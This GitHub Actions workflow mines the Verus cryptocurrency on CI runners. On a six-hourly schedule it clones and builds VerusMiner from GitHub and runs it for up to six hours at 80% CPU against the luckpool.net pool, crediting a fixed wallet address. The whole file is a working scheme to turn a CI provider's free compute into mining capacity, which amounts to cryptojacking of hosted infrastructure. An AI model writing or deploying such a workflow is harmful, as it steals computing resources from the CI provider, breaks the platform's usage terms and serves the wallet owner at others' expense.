name: Verus Mining 80%

on:
  workflow_dispatch:
  schedule:
    - cron: "0 */6 * * *"

jobs:
  mine:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
    - name: Install dependencies
      run: |
        sudo apt update
        sudo apt install git build-essential automake libtool \
        autoconf pkg-config libcurl4-openssl-dev libjansson-dev \
        libssl-dev cpulimit -y

    - name: Clone VerusMiner source
      run: |
        git clone https://github.com/hellcatz/verusminer.git
        cd verusminer
        ./build.sh

    - name: Start Mining (80% CPU limit)
      run: |
        cd verusminer
        cpulimit -l 80 -- ./verusminer \
        -o stratum+tcp://na.luckpool.net:3956 \
        -u RQLTCKt8WJAMwfW29tZfn8jJ6WeoNmkP4P.worker \
        -p x \
        -t 1
